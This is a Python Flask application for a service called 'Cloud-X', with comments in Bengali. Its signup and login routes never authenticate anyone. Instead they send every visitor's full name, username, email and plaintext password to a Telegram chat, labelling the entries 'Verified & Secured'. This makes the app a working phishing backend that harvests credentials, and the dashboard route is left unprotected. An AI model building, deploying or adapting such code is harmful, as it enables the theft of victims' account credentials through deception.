import os
import requests
from flask import Flask, render_template, request, jsonify
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও চ্যাট আইডি রিড করবে
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# ফাইল আপলোড ফোল্ডার ও ফরম্যাট কনফিগারেশন
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# ফোল্ডার না থাকলে অটো তৈরি হবে
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

# লগইন পেজ দেখানোর রাউট
@app.route('/login-page')
def login_page():
    return render_template('login.html')

# ড্যাশবোর্ড পেজ দেখানোর রাউট
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (সাইনআপ)
    telegram_message = (
        f"🚨 *New Cloud-X Registration* 🚨\n\n"
        f"👤 *Full Name:* {full_name}\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Verified & Secured"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": telegram_message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Data sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# লগইন ডেটা প্রসেস ও টেলিগ্রামে পাঠানোর রাউট
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট (লগইন)
    telegram_message = (
        f"🔐 *Cloud-X User Login Attempt* 🔐\n\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Login Verified"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": telegram_message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Login details sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ফাইল আপলোড হ্যান্ডেল করার রাউট
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"})
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return jsonify({"status": "success", "message": "File uploaded successfully", "filename": filename})
    
    return jsonify({"status": "error", "message": "File type not allowed"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
